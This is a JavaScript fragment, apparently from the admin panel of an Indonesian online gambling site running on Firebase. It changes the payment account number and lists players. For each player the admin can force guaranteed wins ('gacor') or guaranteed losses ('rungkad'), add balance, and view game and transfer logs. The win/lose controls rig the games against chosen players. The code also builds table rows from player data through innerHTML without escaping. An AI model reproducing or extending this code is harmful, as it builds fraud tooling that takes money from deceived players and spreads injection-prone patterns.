// update nomor payment ke firebase
function updatePayment() {
    const num = document.getElementById('new-pay-num').value;
    if(num) {
        fb.ref('settings/payment').update({ dana: num });
        alert('nomor dana diganti ke: ' + num);
    }
}

// ambil daftar user + settingan win/lose
fb.ref('players').on('value', s => {
    const list = document.getElementById('user-list');
    list.innerHTML = '';
    s.forEach(item => {
        const p = item.val();
        // status: normal, gacor (pasti menang), rungkad (pasti kalah)
        const status = p.setting || 'normal'; 
        list.innerHTML += `
        <tr>
            <td>${p.u}</td>
            <td>rp ${Number(p.bal).toLocaleString()}</td>
            <td><b style="color:${status==='gacor'?'#00e676':status==='rungkad'?'#ff1744':'#fff'}">${status}</b></td>
            <td>
                <button class="btn-sm" onclick="setSetting('${p.u}', 'gacor')">gacor</button>
                <button class="btn-sm" onclick="setSetting('${p.u}', 'rungkad')">rungkad</button>
                <button class="btn-sm" onclick="editBal('${p.u}', 50000)">+50k</button>
            </td>
        </tr>`;
    });
});

function setSetting(user, mode) {
    fb.ref('players/'+user).update({ setting: mode });
    alert(user + ' sekarang di-set ' + mode);
}

// ambil history permainan
fb.ref('game_logs').limitToLast(10).on('value', s => {
    const list = document.getElementById('history-list');
    list.innerHTML = '';
    s.forEach(item => {
        const h = item.val();
        list.innerHTML += `<tr><td>${h.u}</td><td>${h.g}</td><td>${h.b}</td><td>${h.r}</td><td>${h.t}</td></tr>`;
    });
});

// ambil mutasi saldo
fb.ref('mutasi').limitToLast(10).on('value', s => {
    const list = document.getElementById('mutasi-list');
    list.innerHTML = '';
    s.forEach(item => {
        const m = item.val();
        list.innerHTML += `<tr><td>${m.u}</td><td>${m.type}</td><td>${m.amt}</td><td>${m.time}</td></tr>`;
    });
});
